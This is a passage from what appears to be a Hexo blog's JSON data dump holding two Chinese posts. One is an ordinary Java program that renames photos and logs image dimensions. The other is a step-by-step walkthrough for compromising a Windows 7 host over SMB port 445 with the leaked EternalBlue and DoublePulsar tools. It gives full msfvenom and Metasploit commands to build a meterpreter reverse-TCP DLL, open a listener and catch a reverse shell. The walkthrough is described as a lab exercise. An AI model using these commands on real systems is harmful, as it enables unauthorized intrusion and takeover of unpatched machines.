class=\"line\">exploit</span><br></pre></td></tr></table></figure></p>\n<p>看到如图即说明配置成功</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg\" alt=\"2.jpg\" title=\"2.jpg\"></p>\n<p>这时就可以将xshell最小化，等后边再用</p>\n<h4 id=\"第三步：使用方程式工具包进行攻击\"><a href=\"#第三步：使用方程式工具包进行攻击\" class=\"headerlink\" title=\"第三步：使用方程式工具包进行攻击\"></a>第三步：使用方程式工具包进行攻击</h4><p>0x01</p>\n<p>将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为”listeningposts”的文件夹，如图，不然运行会报错</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg\" alt=\"5.jpg\" title=\"5.jpg\"></p>\n<p>0x02</p>\n<p>打开命令提示符，输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\win\\fb.py</span><br></pre></td></tr></table></figure></p>\n<p>然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/6.jpg\" alt=\"6.jpg\" title=\"6.jpg\"></p>\n<p>0x03</p>\n<p>输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use Eternalblue</span><br></pre></td></tr></table></figure></p>\n<p>然后敲击回车，保持默认设置，除了下图俩需要选择，其他直接敲击回车使用默认配置即可</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/7.jpg\" alt=\"7.jpg\" title=\"7.jpg\"></p>\n<p>之后再敲几下回车开始攻击，得到结果如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/8.jpg\" alt=\"8.jpg\" title=\"8.jpg\"></p>\n<p>可以看到最后”Eternalblue Succeeded”显示成功，当然，不是所有攻击都会成功，需要一定运气的</p>\n<p>0x04</p>\n<p>输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use Doublepulsar</span><br></pre></td></tr></table></figure></p>\n<p>然后会要求输入一些参数，比如系统位数、后门操作、后门路径等，除了下图中红框标出的部分，其他保持默认即可</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/9.jpg\" alt=\"9.jpg\" title=\"9.jpg\"></p>\n<p>接着输入后门路径，即我们之前用kali生成的s.dll，如下图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/10.jpg\" alt=\"10.jpg\" title=\"10.jpg\"></p>\n<p>之后不断敲击回车开始在目标机执行s.dll，成功后如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/11.jpg\" alt=\"\" title=\"11.jpg\"></p>\n<p>这时打开xshell可以看到已经成功反弹shell</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/12.jpg\" alt=\"\" title=\"12.jpg\"></p>\n<p>然后就可以比如说输入shell模拟终端执行命令，创建账户，等等，总之服务器权限已经拿到了</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/13.jpg\" alt=\"13.jpg\" title=\"13.jpg\"></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"验证环境：\"><a href=\"#验证环境：\" class=\"headerlink\" title=\"验证环境：\"></a>验证环境：</h3><p>攻击机1(本次演示IP：172.16.11.2)：windows系统，<a href=\"https://www.python.org/download/releases/2.6.6/\" target=\"_blank\" rel=\"noopener\">安装python2.6.6</a>, <a href=\"https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/\" target=\"_blank\" rel=\"noopener\">pywin32-221.win32-py2.6.exe</a>, xshell, xftp, <a href=\"https://codeload.github.com/misterch0c/shadowbroker/zip/master\" target=\"_blank\" rel=\"noopener\">下载方程式工具包</a>放到C盘，在工具包目录下的windows目录新建文件夹”listeningposts”，并且开放所有端口关闭防火墙，确保内网可以访问之</p>\n<p>攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度</p>\n<p>目标机1(本次演示IP：172.16.12.3)：开放了445端口的windows 7（windows2008与之攻击方法完全相同）</p>\n<p>以上所有IP之间均可以直接访问</p>\n<h3 id=\"验证步骤：\"><a href=\"#验证步骤：\" class=\"headerlink\" title=\"验证步骤：\"></a>验证步骤：</h3>","more":"<hr>\n<h4 id=\"第一步：生成可执行的恶意dll文件\"><a href=\"#第一步：生成可执行的恶意dll文件\" class=\"headerlink\" title=\"第一步：生成可执行的恶意dll文件\"></a>第一步：生成可执行的恶意dll文件</h4><p>0x01</p>\n<p>首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg\" alt=\"1.jpg\" title=\"1.jpg\"></p>\n<p>0x02</p>\n<p>执行命令：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll &gt; s.dll</span><br></pre></td></tr></table></figure></p>\n<p>在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell</p>\n<p>0x03</p>\n<p>点击xshell如图位置</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg\" alt=\"3.jpg\" title=\"3.jpg\"></p>\n<p>打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg\" alt=\"4.jpg\" title=\"4.jpg\"></p>\n<h4 id=\"第二步：配置kali使得kali处于监听状态\"><a href=\"#第二步：配置kali使得kali处于监听状态\" class=\"headerlink\" title=\"第二步：配置kali使得kali处于监听状态\"></a>第二步：配置kali使得kali处于监听状态</h4><p>0x01</p>\n<p>依次输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set lhost 172.16.12.2</span><br><span class=\"line\">set lport 5555</span><br><span class=\"line\">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure></p>\n<p>看到如图即说明配置成功</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg\" alt=\"2.jpg\" title=\"2.jpg\"></p>\n<p>这时就可以将xshell最小化，等后边再用</p>\n<h4 id=\"第三步：使用方程式工具包进行攻击\"><a href=\"#第三步：使用方程式工具包进行攻击\" class=\"headerlink\" title=\"第三步：使用方程式工具包进行攻击\"></a>第三步：使用方程式工具包进行攻击</h4><p>0x01</p>\n<p>将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为”listeningposts”的文件夹，如图，不然运行会报错</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg\" alt=\"5.jpg\" title=\"5.jpg\"></p>\n<p>0x02</p>\n<p>打开命令提示符，输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\win\\fb.py</span><br></pre></td></tr></table></figure></p>\n<p>然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/6.jpg\" alt=\"6.jpg\" title=\"6.jpg\"></p>\n<p>0x03</p>\n<p>输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use Eternalblue</span><br></pre></td></tr></table></figure></p>\n<p>然后敲击回车，保持默认设置，除了下图俩需要选择，其他直接敲击回车使用默认配置即可</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/7.jpg\" alt=\"7.jpg\" title=\"7.jpg\"></p>\n<p>之后再敲几下回车开始攻击，得到结果如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/8.jpg\" alt=\"8.jpg\" title=\"8.jpg\"></p>\n<p>可以看到最后”Eternalblue Succeeded”显示成功，当然，不是所有攻击都会成功，需要一定运气的</p>\n<p>0x04</p>\n<p>输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use Doublepulsar</span><br></pre></td></tr></table></figure></p>\n<p>然后会要求输入一些参数，比如系统位数、后门操作、后门路径等，除了下图中红框标出的部分，其他保持默认即可</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/9.jpg\" alt=\"9.jpg\" title=\"9.jpg\"></p>\n<p>接着输入后门路径，即我们之前用kali生成的s.dll，如下图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/10.jpg\" alt=\"10.jpg\" title=\"10.jpg\"></p>\n<p>之后不断敲击回车开始在目标机执行s.dll，成功后如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/11.jpg\" alt=\"\" title=\"11.jpg\"></p>\n<p>这时打开xshell可以看到已经成功反弹shell</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/12.jpg\" alt=\"\" title=\"12.jpg\"></p>\n<p>然后就可以比如说输入shell模拟终端执行命令，创建账户，等等，总之服务器权限已经拿到了</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/13.jpg\" alt=\"13.jpg\" title=\"13.jpg\"></p>"},{"title":"Java实现文件重命名，Java文件追加写入，java读取图片尺寸","date":"2017-12-15T09:47:38.000Z","_content":"### 起由\n\n因为规范要求，需要对一批文件重命名并获取尺寸，刚好上午的java课学了文件输入输出流，学以致用嘛，就利用java做了尝试。\n### 功能\n1.文件按照指定格式重命名；\n\n2.文件夹内所有文件名与图片尺寸按格式写入一个TXT文件。\n<!--more-->\n### 效果\n之前：\n\n![234-1.jpg](/imgs/234/234-1.jpg)\n之后：\n\n![234-2.jpg](/imgs/234/234-2.jpg)\n\n![234-3.jpg](/imgs/234/234-3.jpg)\n\n### 代码\n```java\nimport java.io.*;\nimport java.awt.image.BufferedImage;\nimport javax.imageio.*;\npublic class FileNameChange{\n\tpublic static void main(String[] args){\n\t\tString dir = \"D:/filenamechangejava/\";\n\t\tFile f1 = new File(dir+\"photo\");\n\t\tFile[] s = f1.listFiles();//为目录下所有文件构造对象到文件数组s中\n\t\tString[] k = new String[100];//定义一个字符串数组来存储文件名\n\t\tfor(int i = 0;i < s.length;i++){\n\t\t\tk[i] = s[i].getName();\n\t\t}//存储所有文件名到k数组中\n\t\tfor(int i = 0;i < s.length;i++){\n\t\t\tk[i] = k[i].substring(0,4)+k[i].substring(5,7)+k[i].substring(8,10)+k[i].substring(11,15)+\".jpg\";//更改文件名为想要的效果\n\t\t\ts[i].renameTo(new File(dir+\"photo/\"+k[i]));//重命名文件\n\t\t}\n\t\tSystem.out.println(\"Rename complete!\");\n\t\t//以上为重命名部分，以下为写文件部分\n\t\tFile[] s2 = f1.listFiles();\n\t\ttry{\n\t\t\tfor(int j = 0;j < s.length;j++){\n\t\t\t\tk[j] = \"\\\"\"+k[j].substring(0,12)+\"\\\",\\n\";\n\t\t\t\tBufferedImage pic = ImageIO.read(new FileInputStream(s2[j]));//读取图片\n\t\t\t\tString m = k[j] + \"\\\"\" + pic.getWidth()+ \"x\" + pic.getHeight()+\"\\\",\\n\\n\";//获取图片宽和高并和文件名一同存储到字符串m\n\t\t\t\tRandomAccessFile fos = new RandomAccessFile(dir+\"name.txt\",\"rw\");//用读写方式打开文件\n\t\t\t\tlong len = fos.length();//返回文件长度到len\n\t\t\t\tfos.seek(len);//定义指针从len开始写入\n\t\t\t\tfos.writeBytes(m);//写入文件\n\t\t\t\tfos.close();\n\t\t\t}\n\t\t}catch(IOException e){\n\t\t\te.printStackTrace();\n\t\t}\n\t\tSystem.out.println(\"Write name and size in \\\"\"+dir+\"name.txt\\\" complete!\");\n\t}\n}\n```","source":"_posts/post234.md","raw":"---\ntitle: Java实现文件重命名，Java文件追加写入，java读取图片尺寸\ndate: 2017-12-15 17:47:38\ntags: [编程,Java]\n---\n### 起由\n\n因为规范要求，需要对一批文件重命名并获取尺寸，刚好上午的java课学了文件输入输出流，学以致用嘛，就利用java做了尝试。\n### 功能\n1.文件按照指定格式重命名；\n\n2.文件夹内所有文件名与图片尺寸按格式写入一个TXT文件。\n<!--more-->\n### 效果\n之前：\n\n![234-1.jpg](/imgs/234/234-1.jpg)\n之后：\n\n![234-2.jpg](/imgs/234/234-2.jpg)\n\n![234-3.jpg](/imgs/234/234-3.jpg)\n\n### 代码\n```java\nimport java.io.*;\nimport java.awt.image.BufferedImage;\nimport javax.imageio.*;\npublic class FileNameChange{\n\tpublic static void main(String[] args){\n\t\tString dir = \"D:/filenamechangejava/\";\n\t\tFile f1 = new File(dir+\"photo\");\n\t\tFile[] s = f1.listFiles();//为目录下所有文件构造对象到文件数组s中\n\t\tString[] k = new String[100];//定义一个字符串数组来存储文件名\n\t\tfor(int i = 0;i < s.length;i++){\n\t\t\tk[i] = s[i].getName();\n\t\t}//存储所有文件名到k数组中\n\t\tfor(int i = 0;i < s.length;i++){\n\t\t\tk[i] = k[i].substring(0,4)+k[i].substring(5,7)+k[i].substring(8,10)+k[i].substring(11,15)+\".jpg\";//更改文件名为想要的效果\n\t\t\ts[i].renameTo(new File(dir+\"photo/\"+k[i]));//重命名文件\n\t\t}\n\t\tSystem.out.println(\"Rename complete!\");\n\t\t//以上为重命名部分，以下为写文件部分\n\t\tFile[] s2 = f1.listFiles();\n\t\ttry{\n\t\t\tfor(int j = 0;j < s.length;j++){\n\t\t\t\tk[j] = \"\\\"\"+k[j].substring(0,12)+\"\\\",\\n\";\n\t\t\t\tBufferedImage pic = ImageIO.read(new FileInputStream(s2[j]));//读取图片\n\t\t\t\tString m = k[j] + \"\\\"\" + pic.getWidth()+ \"x\" + pic.getHeight()+\"\\\",\\n\\n\";//获取图片宽和高并和文件名一同存储到字符串m\n\t\t\t\tRandomAccessFile fos = new RandomAccessFile(dir+\"name.txt\",\"rw\");//用读写方式打开文件\n\t\t\t\tlong len = fos.length();//返回文件长度到len\n\t\t\t\tfos.seek(len);//定义指针从len开始写入\n\t\t\t\tfos.writeBytes(m);//写入文件\n\t\t\t\tfos.close();\n\t\t\t}\n\t\t}catch(IOException e){\n\t\t\te.printStackTrace();\n\t\t}\n\t\tSystem.out.println(\"Write name and size in \\\"\"+dir+\"name.txt\\\" complete!\");\n\t}\n}\n```","slug":"post234","published":1,"updated":"2020-12-07T02:09:31.153Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdp0027q0sz0pfenr8q","content":"<h3 id=\"起由\"><a href=\"#起由\" class=\"headerlink\" title=\"起由\"></a>起由</h3><p>因为规范要求，需要对一批文件重命名并获取尺寸，刚好上午的java课学了文件输入输出流，学以致用嘛，就利用java做了尝试。</p>\n<h3 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h3><p>1.文件按照指定格式重命名；</p>\n<p>2.文件夹内所有文件名与图片尺寸按格式写入一个TXT文件。<br><a id=\"more\"></a></p>\n<h3 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h3><p>之前：</p>\n<p><img src=\"/imgs/234/234-1.jpg\" alt=\"234-1.jpg\"><br>之后：</p>\n<p><img src=\"/imgs/234/234-2.jpg\" alt=\"234-2.jpg\"></p>\n<p><img src=\"/imgs/234/234-3.jpg\" alt=\"234-3.jpg\"></p>\n<h3 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.image.BufferedImage;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.imageio.*;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileNameChange</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">\t\tString dir = <span class=\"string\">\"D:/filenamechangejava/\"</span>;</span><br><span class=\"line\">\t\tFile f1 = <span class=\"keyword\">new</span> File(dir+<span class=\"string\">\"photo\"</span>);</span><br><span class=\"line\">\t\tFile[] s = f1.listFiles();<span class=\"comment\">//为目录下所有文件构造对象到文件数组s中</span></span><br><span class=\"line\">\t\tString[] k = <span class=\"keyword\">new</span> String[<span class=\"number\">100</span>];<span class=\"comment\">//定义一个字符串数组来存储文件名</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; s.length;i++)&#123;</span><br><span class=\"line\">\t\t\tk[i] = s[i].getName();</span><br><span class=\"line\">\t\t&#125;<span class=\"comment\">//存储所有文件名到k数组中</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; s.length;i++)&#123;</span><br><span class=\"line\">\t\t\tk[i] = k[i].substring(<span class=\"number\">0</span>,<span class=\"number\">4</span>)+k[i].substring(<span class=\"number\">5</span>,<span class=\"number\">7</span>)+k[i].substring(<span class=\"number\">8</span>,<span class=\"number\">10</span>)+k[i].substring(<span class=\"number\">11</span>,<span class=\"number\">15</span>)+<span class=\"string\">\".jpg\"</span>;<span class=\"comment\">//更改文件名为想要的效果</span></span><br><span class=\"line\">\t\t\ts[i].renameTo(<span class=\"keyword\">new</span> File(dir+<span class=\"string\">\"photo/\"</span>+k[i]));<span class=\"comment\">//重命名文件</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"Rename complete!\"</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//以上为重命名部分，以下为写文件部分</span></span><br><span class=\"line\">\t\tFile[] s2 = f1.listFiles();</span><br><span class=\"line\">\t\t<span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;j &lt; s.length;j++)&#123;</span><br><span class=\"line\">\t\t\t\tk[j] = <span class=\"string\">\"\\\"\"</span>+k[j].substring(<span class=\"number\">0</span>,<span class=\"number\">12</span>)+<span class=\"string\">\"\\\",\\n\"</span>;</span><br><span class=\"line\">\t\t\t\tBufferedImage pic = ImageIO.read(<span class=\"keyword\">new</span> FileInputStream(s2[j]));<span class=\"comment\">//读取图片</span></span><br><span class=\"line\">\t\t\t\tString m = k[j] + <span class=\"string\">\"\\\"\"</span> + pic.getWidth()+ <span class=\"string\">\"x\"</span> + pic.getHeight()+<span class=\"string\">\"\\\",\\n\\n\"</span>;<span class=\"comment\">//获取图片宽和高并和文件名一同存储到字符串m</span></span><br><span class=\"line\">\t\t\t\tRandomAccessFile fos = <span class=\"keyword\">new</span> RandomAccessFile(dir+<span class=\"string\">\"name.txt\"</span>,<span class=\"string\">\"rw\"</span>);<span class=\"comment\">//用读写方式打开文件</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">long</span> len = fos.length();<span class=\"comment\">//返回文件长度到len</span></span><br><span class=\"line\">\t\t\t\tfos.seek(len);<span class=\"comment\">//定义指针从len开始写入</span></span><br><span class=\"line\">\t\t\t\tfos.writeBytes(m);<span class=\"comment\">//写入文件</span></span><br><span class=\"line\">\t\t\t\tfos.close();</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">catch</span>(IOException e)&#123;</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"Write name and size in \\\"\"</span>+dir+<span class=\"string\">\"name.txt\\\" complete!\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h3 id=\"起由\"><a href=\"#起由\" class=\"headerlink\" title=\"起由\"></a>起由</h3><p>因为规范要求，需要对一批文件重命名并获取尺寸，刚好上午的java课学了文件输入输出流，学以致用嘛，就利用java做了尝试。</p>\n<h3 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h3><p>1.文件按照指定格式重命名；</p>\n<p>2.文件夹内所有文件名与图片尺寸按格式写入一个TXT文件。<br>","more":"</p>\n<h3 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h3><p>之前：</p>\n<p><img src=\"/imgs/234/234-1.jpg\" alt=\"234-1.jpg\"><br>之后：</p>\n<p><img src=\"/imgs/234/234-2.jpg\" alt=\"234-2.jpg\"></p>\n<p><img src=\"/imgs/234/234-3.jpg\" alt=\"234-3.jpg\"></p>\n<h3 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.image.BufferedImage;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.imageio.*;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileNameChange</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">\t\tString dir = <span class=\"string\">\"D:/filenamechangejava/\"</span>;</span><br><span class=\"line\">\t\tFile f1 = <span class=\"keyword\">new</span> File(dir+<span class=\"string\">\"photo\"</span>);</span><br><span class=\"line\">\t\tFile[] s = f1.listFiles();<span class=\"comment\">//为目录下所有文件构造对象到文件数组s中</span></span><br><span class=\"line\">\t\tString[] k = <span class=\"keyword\">new</span> String[<span class=\"number\">100</span>];<span class=\"comment\">//定义一个字符串数组来存储文件名</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; s.length;i++)&#123;</span><br><span class=\"line\">\t\t\tk[i] = s[i].getName();</span><br><span class=\"line\">\t\t&#125;<span class=\"comment\">//存储所有文件名到k数组中</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; s.length;i++)&#123;</span><br><span class=\"line\">\t\t\tk[i] = k[i].substring(<span class=\"number\">0</span>,<span class=\"number\">4</span>)+k[i].substring(<span class=\"number\">5</span>,<span class=\"number\">7</span>)+k[i].substring(<span class=\"number\">8</span>,<span class=\"number\">10</span>)+k[i].substring(<span class=\"number\">11</span>,<span class=\"number\">15</span>)+<span class=\"string\">\".jpg\"</span>;<span class=\"comment\">//更改文件名为想要的效果</span></span><br><span class=\"line\">\t\t\ts[i].renameTo(<span class=\"keyword\">new</span> File(dir+<span class=\"string\">\"photo/\"</span>+k[i]));<span class=\"comment\">//重命名文件</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"Rename complete!\"</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//以上为重命名部分，以下为写文件部分</span></span><br><span class=\"line\">\t\tFile[] s2 = f1.listFiles();</span><br><span class=\"line\">\t\t<span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;j &lt; s.length;j++)&#123;</span><br><span class=\"line\">\t\t\t\tk[j] = <span class=\"string\">\"\\\"\"</span>+k[j].substring(<span class=\"number\">0</span>,<span class=\"number\">12</span>)+<span class=\"string\">\"\\\",\\n\"</span>;</span><br><span class=\"line\">\t\t\t\tBufferedImage pic = ImageIO.read(<span class=\"keyword\">new</span> FileInputStream(s2[j]));<span class=\"comment\">//读取图片</span></span><br><span class=\"line\">\t\t\t\tString m = k[j] + <span class=\"string\">\"\\\"\"</span> + pic.getWidth()+ <span class=\"string\">\"x\"</span> + pic.getHeight()+<span class=\"string\">\"\\\",\\n\\n\"</span>;<span class=\"comment\">//获取图片宽和高并和文件名一同存储到字符串m</span></span><br><span class=\"line\">\t\t\t\tRandomAccessFile fos = <span class=\"keyword\">new</span> RandomAccessFile(dir+<span class=\"string\">\"name.txt\"</span>,<span class=\"string\">\"rw\"</span>);<span class=\"comment\">//用读写方式打开文件</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">long</span> len = fos.length();<span class=\"comment\">//返回文件长度到len</span></span><br><span class=\"line\">\t\t\t\tfos.seek(len);<span class=\"comment\">//定义指针从len开始写入</span></span><br><span class=\"line\">\t\t\t\tfos.writeBytes(m);<span class=\"comment\">//写入文件</span></span><br><span class=\"line\">\t\t\t\tfos.close();</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">catch</span>(IOException e)&#123;</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"Write name and size in \\\"\"</span>+dir+<span class=\"string\">\"name.txt\\\" complete!\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"hexo-yilia主题相册","date":"2017-12-17T08:27:43.000Z","_content":"### 